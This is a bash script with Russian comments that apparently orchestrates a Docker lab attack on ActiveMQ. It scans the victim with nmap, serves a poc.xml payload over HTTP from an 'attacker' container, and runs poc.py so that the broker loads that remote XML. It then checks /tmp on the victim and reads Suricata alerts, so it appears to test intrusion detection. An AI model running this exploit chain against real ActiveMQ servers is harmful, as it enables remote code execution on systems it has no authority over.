#!/bin/bash
set -e

echo "=== Шаг 1: Сканирование портов ActiveMQ ==="
docker exec attacker nmap -sV -p 61616,8161 172.20.0.101

echo ""
echo "=== Шаг 2: Копирование файлов в контейнер attacker ==="
docker cp poc.py attacker:/root/poc.py
docker cp poc.xml attacker:/root/poc.xml
echo "Файлы скопированы"

echo ""
echo "=== Шаг 3: Запуск HTTP-сервера в фоне ==="
docker exec -d attacker bash -c "cd /root && python3 -m http.server 8888"
sleep 2
echo "HTTP-сервер запущен на порту 8888"

echo ""
echo "=== Шаг 4: Выполнение атаки ==="
docker exec attacker python3 /root/poc.py 172.20.0.101 61616 http://172.20.0.10:8888/poc.xml
echo "Атака выполнена"
sleep 3
echo "Ожидание обработки событий Suricata..."

echo ""
echo "=== Шаг 5: Проверка содержимого /tmp в victim-activemq ==="
docker exec victim-activemq ls -la /tmp

echo ""
echo "=== Шаг 6: Последние записи из Suricata ==="
# Пытаемся получить логи разными способами
if [ -f /var/log/suricata/eve.json ]; then
  echo "Логи с локального хоста:"
  tail -n 50 /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert" or .event_type=="http") | "\(.timestamp) [\(.event_type)] \(.alert.signature)"' 2>/dev/null || tail -n 50 /var/log/suricata/eve.json
elif [ -n "$HOST" ]; then
  echo "Логи с удаленного хоста:"
  ssh -o StrictHostKeyChecking=no "$HOST" 'tail -n 50 /var/log/suricata/eve.json 2>/dev/null | jq -r "select(.event_type==\"alert\" or .event_type==\"http\") | \"\(.timestamp) [\(.event_type)] \(.alert.signature)\"" 2>/dev/null || tail -n 50 /var/log/suricata/eve.json 2>/dev/null' || echo "Логи Suricata недоступны. Проверьте через EveBox на порту 5636"
else
  echo "Логи Suricata недоступны напрямую. Проверьте через EveBox на порту 5636 или на хосте в /var/log/suricata/eve.json"
fi

echo ""
echo "=== Тест завершен ==="
